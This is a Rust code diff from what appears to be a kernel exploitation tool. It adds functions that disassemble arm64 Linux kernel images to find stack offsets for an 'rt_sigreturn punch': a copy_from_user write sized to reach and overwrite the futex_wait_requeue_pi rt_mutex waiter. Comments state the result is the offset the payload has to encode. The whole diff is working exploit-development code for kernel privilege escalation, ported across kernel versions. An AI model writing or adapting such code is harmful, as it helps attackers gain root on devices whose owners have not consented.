@@ -231,6 +231,234 @@ pub fn multicast_waiter_off(
     })
 }
 
+/// Trailing bytes the punch must still fit past `waiter_off`: the waiter's
+/// `task` + `lock` words plus one more qword, i.e. `waiter_off + 0x40 <= buffer`.
+pub const SIGRET_TAIL: u64 = 0x40;
+
+/// rt_sigreturn fpsimd punch geometry for one kernel image.
+///
+/// `D = frame(__arm64_sys_rt_sigreturn) - copy_local` is how deep the
+/// `copy_from_user` write reaches below the syscall's stack top;
+/// `waiter_depth` is where the futex waiter lives; the difference is the
+/// offset the payload has to encode the waiter at.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct SigretGeometry {
+    pub container_frame: u64,
+    pub copy_local: u64,
+    pub copy_size: u64,
+    pub futex_frames: u64,
+    pub waiter_local: u64,
+    pub waiter_depth: u64,
+    pub d: u64,
+    pub waiter_off: i64,
+}
+
+impl SigretGeometry {
+    pub fn feasible(&self) -> bool {
+        self.waiter_off >= 0 && (self.waiter_off as u64) + SIGRET_TAIL <= self.copy_size
+    }
+
+    pub fn infeasible_reason(&self) -> String {
+        if self.waiter_off < 0 {
+            format!(
+                "write window starts {} bytes above the waiter \
+                 (D=0x{:x} < depth=0x{:x})",
+                -self.waiter_off, self.d, self.waiter_depth
+            )
+        } else {
+            format!(
+                "waiter tail 0x{:x} exceeds the 0x{:x}-byte copy",
+                self.waiter_off as u64 + SIGRET_TAIL,
+                self.copy_size
+            )
+        }
+    }
+}
+
+/// Backwards `add xN, sp, #imm` search. `prefer_x0` returns the first x0 hit
+/// immediately; otherwise the nearest hit of any register is used.
+fn add_sp_before(lines: &[String], index: usize, window: usize) -> Option<(String, u64)> {
+    let re = Regex::new(r"(?i)\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)").unwrap();
+    let lo = index.saturating_sub(window);
+    let mut nearest: Option<(String, u64)> = None;
+    for line in lines[lo..index].iter().rev() {
+        if let Some(caps) = re.captures(line) {
+            let register = caps[1].to_ascii_lowercase();
+            let imm = u64::from_str_radix(&caps[2], 16).unwrap_or(0);
+            if register == "x0" {
+                return Some((register, imm));
+            }
+            if nearest.is_none() {
+                nearest = Some((register, imm));
+            }
+        }
+    }
+    nearest
+}
+
+/// `mov w2, #size` + `add xN, sp, #local` pattern used by every bulk
+/// `copy_from_user` call. Only sizes that can carry an fpsimd frame are
+/// accepted, and 0x200 (the rt_sigreturn vregs blob) wins over anything else.
+fn copy_site(lines: &[String]) -> Option<(u64, u64)> {
+    let mov = Regex::new(r"(?i)\bmov\s+w2,\s*#0x([0-9a-f]+)").unwrap();
+    let mut candidates: Vec<(u8, u8, u64, u64)> = Vec::new();
+    for (index, line) in lines.iter().enumerate() {
+        let Some(caps) = mov.captures(line) else {
+            continue;
+        };
+        let size = u64::from_str_radix(&caps[1], 16).unwrap_or(0);
+        if !(0x100..=0x400).contains(&size) {
+            continue;
+        }
+        let Some((register, local)) = add_sp_before(lines, index, 8) else {
+            continue;
+        };
+        let size_rank = u8::from(size != 0x200);
+        let register_rank = u8::from(register != "x0");
+        candidates.push((size_rank, register_rank, local, size));
+    }
+    candidates.sort_by_key(|(size_rank, register_rank, _, _)| (*size_rank, *register_rank));
+    candidates.first().map(|(_, _, local, size)| (*local, *size))
+}
+
+/// Some kernels move the fpsimd restore into a helper (`read_fpsimd_context`),
+/// so the copy site lives in the callee while the buffer offset is materialised
+/// at the call site. Returns `(caller_local, callee_copy_size)`.
+fn copy_site_via_callee(kernel: &[u8], container: &[String]) -> Option<(u64, u64)> {
+    let call_re = Regex::new(r"(?i)\bbl\s+0x([0-9a-f]+)").unwrap();
+    for (index, line) in container.iter().enumerate() {
+        let Some(caps) = call_re.captures(line) else {
+            continue;
+        };
+        let Ok(target) = u64::from_str_radix(&caps[1], 16) else {
+            continue;
+        };
+        let start = target as usize;
+        let stop = start.saturating_add(0x800);
+        if stop > kernel.len() {
+            continue;
+        }
+        let Ok(callee) = disassemble_range(kernel, start, stop) else {
+            continue;
+        };
+        let Some((_, size)) = copy_site(&callee) else {
+            continue;
+        };
+        if let Some((_, local)) = add_sp_before(container, index, 6) {
+            return Some((local, size));
+        }
+    }
+    None
+}
+
+/// `memset(&waiter, 0, sizeof(waiter))` anchor used up to 6.1.
+fn waiter_local_from_memset(lines: &[String], wait_size: u64) -> Option<u64> {
+    let mov = Regex::new(&format!(r"(?i)\bmov\s+w2,\s*#0x{wait_size:x}\b")).unwrap();
+    for (index, line) in lines.iter().enumerate() {
+        if mov.is_match(line) {
+            if let Some((_, local)) = add_sp_before(lines, index, 8) {
+                return Some(local);
+            }
+        }
+    }
+    None
+}
+
+/// `rt_mutex_*_proxy_lock(&lock, &waiter)` anchor used from 6.6 on, where the
+/// memset was folded away: the waiter pointer is the x1 argument.
+fn waiter_local_from_proxy_lock(symbols: &RelSymbols, futex_lines: &[String]) -> Option<u64> {
+    for name in [
+        "rt_mutex_start_proxy_lock",
+        "rt_mutex_wait_proxy_lock",
+        "rt_mutex_cleanup_proxy_lock",
+    ] {
+        let Some(address) = unique_offset_optional(symbols, name) else {
+            continue;
+        };
+        let call = Regex::new(&format!(r"(?i)\bbl\s+0x{address:x}\b")).unwrap();
+        for (index, line) in futex_lines.iter().enumerate() {
+            if !call.is_match(line) {
+                continue;
+            }
+            let re = Regex::new(r"(?i)\badd\s+x1,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
+            let lo = index.saturating_sub(8);
+            for prev in futex_lines[lo..index].iter().rev() {
+                if let Some(caps) = re.captures(prev) {
+                    return u64::from_str_radix(&caps[1], 16).ok();
+                }
+            }
+        }
+    }
+    None
+}
+
+fn futex_waiter_depth(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted: &[u64],
+) -> Result<(u64, u64)> {
+    let sys_futex = disassemble_symbol(kernel, symbols, sorted, "__arm64_sys_futex", OBJDUMP_CAP)?;
+    let requeue = unique_offset_optional(symbols, "futex_wait_requeue_pi")
+        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi is not in kallsyms"))?;
+    // `do_futex` is inlined on some builds: only count the frame that is
+    // actually on the stack between the syscall entry and the waiter function.
+    let inline_do_futex = has_direct_call(&sys_futex, requeue);
+    let mut frames = first_sp_frame(&sys_futex, "__arm64_sys_futex")?;
+    if !inline_do_futex {
+        frames += sum_chain_frames(kernel, symbols, sorted, &["do_futex"])?;
+    }
+    let futex = disassemble_symbol(
+        kernel,
+        symbols,
+        sorted,
+        "futex_wait_requeue_pi",
+        OBJDUMP_CAP,
+    )?;
+    frames += first_sp_frame(&futex, "futex_wait_requeue_pi")?;
+    let local = [0x58u64, 0x68, 0x70]
+        .into_iter()
+        .find_map(|size| waiter_local_from_memset(&futex, size))
+        .or_else(|| waiter_local_from_proxy_lock(symbols, &futex))
+        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
+    Ok((frames, local))
+}
+
+/// Static rt_sigreturn punch geometry: `D = frame(rt_sigreturn) - copy_local`,
+/// `waiter_off = D - (Σ futex frames - waiter_local)`.
+pub fn derive_sigret_geometry(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted: &[u64],
+) -> Result<SigretGeometry> {
+    const CONTAINER: &str = "__arm64_sys_rt_sigreturn";
+    let container = disassemble_symbol(kernel, symbols, sorted, CONTAINER, OBJDUMP_CAP)?;
+    let container_frame = first_sp_frame(&container, CONTAINER)?;
+    let (copy_local, copy_size) = copy_site(&container)
+        .or_else(|| copy_site_via_callee(kernel, &container))
+        .ok_or_else(|| {
+            ExtractError::new(
+                "__arm64_sys_rt_sigreturn has no fpsimd copy_from_user site",
+            )
+        })?;
+    let (futex_frames, waiter_local) = futex_waiter_depth(kernel, symbols, sorted)?;
+    let waiter_depth = futex_frames
+        .checked_sub(waiter_local)
+        .ok_or_else(|| ExtractError::new("waiter local exceeds the futex frame depth"))?;
+    let d = container_frame
+        .checked_sub(copy_local)
+        .ok_or_else(|| ExtractError::new("copy local exceeds the rt_sigreturn frame"))?;
+    Ok(SigretGeometry {
+        container_frame,
+        copy_local,
+        copy_size,
+        futex_frames,
+        waiter_local,
+        waiter_depth,
+        d,
+        waiter_off: d as i64 - waiter_depth as i64,
+    })
+}
+
 #[cfg(test)]
 mod tests {
     use super::{
